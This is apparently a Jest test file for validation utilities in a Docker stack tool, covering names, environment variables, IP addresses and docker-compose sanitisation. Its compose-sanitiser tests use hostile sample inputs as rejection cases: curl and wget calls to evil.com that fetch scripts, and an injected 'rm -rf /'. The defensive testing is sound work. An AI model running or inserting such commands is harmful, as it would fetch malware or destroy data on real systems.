import { describe, it, expect } from '@jest/globals';
import {
  validateServiceName,
  validateStackName,
  validateEnvVarName,
  validateEnvVarValue,
  validateIPAddress,
  sanitizeDockerCompose,
  validateEnvVars,
} from '../../../src/utils/validation.js';

describe('Validation Utilities', () => {
  describe('validateServiceName', () => {
    it('should accept valid service names', () => {
      expect(validateServiceName('cloudflare-tunnel')).toEqual({ valid: true });
      expect(validateServiceName('Authentik SSO')).toEqual({ valid: true });
      expect(validateServiceName('my_service_123')).toEqual({ valid: true });
    });

    it('should reject empty names', () => {
      const result = validateServiceName('');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('required');
    });

    it('should reject names that are too long', () => {
      const longName = 'a'.repeat(51);
      const result = validateServiceName(longName);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('50 characters');
    });

    it('should reject names with special characters', () => {
      const result = validateServiceName('service@name!');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('letters, numbers, spaces, dashes, and underscores');
    });

    it('should reject non-string inputs', () => {
      const result = validateServiceName(123 as unknown as string);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('string');
    });
  });

  describe('validateStackName', () => {
    it('should accept valid stack names', () => {
      expect(validateStackName('cloudflare-tunnel')).toEqual({ valid: true });
      expect(validateStackName('my_stack_123')).toEqual({ valid: true });
      expect(validateStackName('Stack1')).toEqual({ valid: true });
    });

    it('should reject stack names with spaces', () => {
      const result = validateStackName('my stack');
      expect(result.valid).toBe(false);
    });

    it('should reject stack names starting with numbers', () => {
      const result = validateStackName('123stack');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('start with a letter');
    });

    it('should reject stack names starting with dashes', () => {
      const result = validateStackName('-mystack');
      expect(result.valid).toBe(false);
    });

    it('should reject empty stack names', () => {
      const result = validateStackName('');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('required');
    });
  });

  describe('validateEnvVarName', () => {
    it('should accept valid environment variable names', () => {
      expect(validateEnvVarName('API_TOKEN')).toEqual({ valid: true });
      expect(validateEnvVarName('CLOUDFLARE_API_KEY')).toEqual({ valid: true });
      expect(validateEnvVarName('PORT_NUMBER_123')).toEqual({ valid: true });
    });

    it('should reject lowercase names', () => {
      const result = validateEnvVarName('api_token');
      expect(result.valid).toBe(false);
    });

    it('should reject names starting with numbers', () => {
      const result = validateEnvVarName('123_API_KEY');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('start with uppercase letter');
    });

    it('should reject names with lowercase letters', () => {
      const result = validateEnvVarName('Api_Token');
      expect(result.valid).toBe(false);
    });

    it('should reject names with special characters', () => {
      const result = validateEnvVarName('API-TOKEN');
      expect(result.valid).toBe(false);
    });
  });

  describe('validateEnvVarValue', () => {
    it('should accept valid environment variable values', () => {
      expect(validateEnvVarValue('my-secret-key-123')).toEqual({ valid: true });
      expect(validateEnvVarValue('')).toEqual({ valid: true }); // Empty values are allowed
      expect(validateEnvVarValue('https://api.example.com')).toEqual({ valid: true });
    });

    it('should reject values with null bytes', () => {
      const result = validateEnvVarValue('value\0with\0nulls');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('null bytes');
    });

    it('should reject values that are too long', () => {
      const longValue = 'a'.repeat(10001);
      const result = validateEnvVarValue(longValue);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('10000 characters');
    });

    it('should reject non-string values', () => {
      const result = validateEnvVarValue(123 as unknown as string);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('string');
    });
  });

  describe('validateIPAddress', () => {
    it('should accept valid IPv4 addresses', () => {
      expect(validateIPAddress('192.168.1.1')).toEqual({ valid: true });
      expect(validateIPAddress('10.0.0.1')).toEqual({ valid: true });
      expect(validateIPAddress('172.16.0.1')).toEqual({ valid: true });
      expect(validateIPAddress('8.8.8.8')).toEqual({ valid: true });
      expect(validateIPAddress('0.0.0.0')).toEqual({ valid: true });
      expect(validateIPAddress('255.255.255.255')).toEqual({ valid: true });
    });

    it('should reject invalid IPv4 addresses', () => {
      expect(validateIPAddress('256.1.1.1').valid).toBe(false);
      expect(validateIPAddress('192.168.1').valid).toBe(false);
      expect(validateIPAddress('192.168.1.1.1').valid).toBe(false);
      expect(validateIPAddress('abc.def.ghi.jkl').valid).toBe(false);
    });

    it('should accept valid IPv6 addresses', () => {
      expect(validateIPAddress('2001:0db8:0000:0000:0000:0000:0000:0001')).toEqual({
        valid: true,
      });
      expect(validateIPAddress('fe80:0000:0000:0000:0000:0000:0000:0001')).toEqual({
        valid: true,
      });
    });

    it('should accept compressed IPv6 addresses', () => {
      expect(validateIPAddress('2001:db8::1')).toEqual({ valid: true });
      expect(validateIPAddress('::1')).toEqual({ valid: true });
      expect(validateIPAddress('fe80::1')).toEqual({ valid: true });
    });

    it('should reject empty IP addresses', () => {
      const result = validateIPAddress('');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('required');
    });

    it('should reject invalid IP formats', () => {
      expect(validateIPAddress('not-an-ip').valid).toBe(false);
      expect(validateIPAddress('192.168').valid).toBe(false);
    });
  });

  describe('sanitizeDockerCompose', () => {
    it('should accept valid docker-compose files', () => {
      const validCompose = `version: '3.8'
services:
  web:
    image: nginx:latest
    ports:
      - "80:80"`;
      expect(sanitizeDockerCompose(validCompose)).toEqual({ valid: true });
    });

    it('should accept docker-compose without version', () => {
      const validCompose = `services:
  web:
    image: nginx:latest`;
      expect(sanitizeDockerCompose(validCompose)).toEqual({ valid: true });
    });

    it('should reject compose with command substitution', () => {
      const malicious = `version: '3.8'
services:
  web:
    image: nginx
    command: $(curl evil.com/malware.sh)`;
      const result = sanitizeDockerCompose(malicious);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('suspicious patterns');
    });

    it('should reject compose with backtick execution', () => {
      const malicious = `version: '3.8'
services:
  web:
    image: \`wget evil.com/script.sh\``;
      const result = sanitizeDockerCompose(malicious);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('suspicious patterns');
    });

    it('should reject compose with chained dangerous commands', () => {
      const malicious = `version: '3.8'
services:
  web:
    image: nginx; rm -rf /`;
      const result = sanitizeDockerCompose(malicious);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('suspicious patterns');
    });

    it('should reject compose with null bytes', () => {
      const malicious = 'version: "3.8"\0services:\0';
      const result = sanitizeDockerCompose(malicious);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('null bytes');
    });

    it('should reject compose that is too large', () => {
      const largeCompose = 'version: "3.8"\n' + 'a'.repeat(100001);
      const result = sanitizeDockerCompose(largeCompose);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('too large');
    });

    it('should reject compose not starting with version or services', () => {
      const invalid = `networks:
  mynetwork:
    driver: bridge`;
      const result = sanitizeDockerCompose(invalid);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('start with');
    });

    it('should reject empty compose', () => {
      const result = sanitizeDockerCompose('');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('required');
    });
  });

  describe('validateEnvVars', () => {
    it('should accept valid environment variables object', () => {
      const envVars = {
        API_TOKEN: 'secret-key-123',
        CLOUDFLARE_API_KEY: 'cf-key-456',
        PORT_NUMBER: '3000',
      };
      expect(validateEnvVars(envVars)).toEqual({ valid: true, errors: [] });
    });

    it('should reject invalid variable names', () => {
      const envVars = {
        'api-token': 'value',
        VALID_NAME: 'value',
      };
      const result = validateEnvVars(envVars);
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors[0]).toContain('api-token');
    });

    it('should reject invalid variable values', () => {
      const envVars = {
        API_TOKEN: 'a'.repeat(10001), // Too long
      };
      const result = validateEnvVars(envVars);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('10000 characters');
    });

    it('should reject non-object inputs', () => {
      const result = validateEnvVars('not an object' as unknown as Record<string, string>);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('object');
    });

    it('should reject null input', () => {
      const result = validateEnvVars(null as unknown as Record<string, string>);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('object');
    });

    it('should reject array input', () => {
      const result = validateEnvVars(['value1', 'value2'] as unknown as Record<string, string>);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('object');
    });

    it('should collect multiple errors', () => {
      const envVars = {
        'invalid-name-1': 'value1',
        'invalid-name-2': 'value2',
        VALID_NAME: 'a'.repeat(10001),
      };
      const result = validateEnvVars(envVars);
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(2);
    });

    it('should accept empty object', () => {
      expect(validateEnvVars({})).toEqual({ valid: true, errors: [] });
    });
  });
});
